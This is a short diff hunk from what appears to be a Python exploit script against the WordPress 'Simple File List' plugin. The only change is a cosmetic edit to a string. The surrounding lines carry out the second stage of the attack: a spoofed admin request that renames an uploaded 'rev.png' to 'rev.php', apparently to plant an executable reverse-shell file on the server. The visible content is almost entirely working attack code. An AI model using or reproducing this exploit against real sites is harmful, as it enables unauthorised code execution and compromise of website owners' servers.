@@ -45,7 +45,7 @@ r = requests.post(url=f'{target}{upload_path}', data=datas, files=files, verify=
 # Stage 2 - move
 print("[!] Sending stage 2...")
 headers = {'Referer': f'{target}/wp-admin/admin.php?page=ee-simple-file-list&tab=file_list&eeListID=1', 'X-Requested-With': 'XMLHttpRequest'}
-datas2 = {'eeSFL_ID': 1, 'eeFileOld': 'rev.png', 'eeListFolder': '/', 'eeFileAction': f'Rename|rev.php'}
+datas2 = {'eeSFL_ID': 1, 'eeFileOld': 'rev.png', 'eeListFolder': '/', 'eeFileAction': 'Rename|rev.php'}
 r2 = requests.post(url=f'{target}{move_path}', data=datas2, headers=headers, verify=False)
 
 
